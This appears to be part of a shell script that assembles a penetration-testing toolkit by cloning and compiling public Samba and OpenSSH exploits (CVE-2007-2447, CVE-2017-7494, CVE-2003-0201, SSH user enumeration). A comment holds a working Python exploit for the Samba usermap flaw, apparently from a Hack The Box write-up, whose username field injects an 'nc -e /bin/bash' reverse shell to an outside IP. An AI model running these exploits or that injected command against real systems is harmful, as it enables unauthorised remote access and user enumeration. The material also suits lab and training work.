# gcc -Wall -m32 -o <output> <code>
# gcc -Wall -m64 -o <output> <code>

# create shared library
# gcc overwrite_puts.c -o overw_puts -shared -fPIC

mkdir -p public/exploits_linux/samba
cd public/exploits_linux/samba

    banner "exploits_linux/samba - CVE-2007-2447-3.0.0-3.0.25rc3-usermap - https://github.com/amriunix/CVE-2007-2447.git"
    git clone --depth=1 --recursive https://github.com/amriunix/CVE-2007-2447.git CVE-2007-2447-3.0.0-3.0.25rc3-usermap

<< --MULTILINE-COMMENT--
  #!/usr/bin/python
  # https://wiki.jacobshodd.com/writeups/hack-the-box/lame
  from smb.SMBConnection import SMBConnection
  from smb import smb_structs
  smb_structs.SUPPORT_SMB2 = False
  import sys
  if len(sys.argv) < 2:
      print "\nUsage: " + sys.argv[0] + " <HOST>\n"
      sys.exit()

  username = "/=\`nc -e /bin/bash 10.10.14.12 4443\`"
  password = ""
  conn = SMBConnection(username, password, "HACKTHEBOX" , "HTB", use_ntlm_v2 = False)
  assert conn.connect(sys.argv[1], 445)
--MULTILINE-COMMENT--
  
    banner "exploits_linux/samba - installing python"
    sudo apt install --no-upgrade python
    banner "exploits_linux/samba - installing python-pip"
    sudo apt install --no-upgrade python-pip
    banner "exploits_linux/samba - installing pysmb"
    pip install --user pysmb

    banner "exploits_linux/samba - CVE-2017-7494-4.5.9-SambaCry - https://github.com/opsxcq/exploit-CVE-2017-7494.git"
    git clone --depth=1 --recursive https://github.com/opsxcq/exploit-CVE-2017-7494.git CVE-2017-7494-4.5.9-SambaCry

    banner "exploits_linux/samba - CVE-2017-7494-4.5.9-3.5.0-3.6.0-SambaCry - https://github.com/joxeankoret/CVE-2017-7494.git"
    git clone --depth=1 --recursive https://github.com/joxeankoret/CVE-2017-7494.git CVE-2017-7494-4.5.9-3.5.0-3.6.0-SambaCry

    if [ ! -f 2.2.8_CVE-2003-0201 ]; then
        banner "exploits_linux/samba - 2.2.8_CVE-2003-0201 - https://www.exploit-db.com/exploits/10"
        searchsploit -m 10
        mv 10.c 2.2.8_CVE-2003-0201.c 
        gcc 2.2.8_CVE-2003-0201.c -o 2.2.8_CVE-2003-0201
    fi
  
cd ../../..


mkdir -p public/exploits_linux/ssh
cd public/exploits_linux/ssh

    if [ ! -f ssh-userenum-openssh-7.2p2.py ]; then
        banner "exploits_linux/ssh - ssh-userenum-openssh-7.2p2.py - https://www.exploit-db.com/exploits/40136"
        searchsploit -m 40136
        mv 40136.py ssh-userenum-openssh-7.2p2.py
    fi

    if [ ! -f ssh-userenum-openssh-2.3to7.7.py ]; then
        banner "exploits_linux/ssh - ssh-userenum-openssh-2.3to7.7.py - https://www.exploit-db.com/exploits/45233"
        searchsploit -m 45233
        mv 45233.py ssh-userenum-openssh-2.3to7.7.py
    fi

cd ../../..
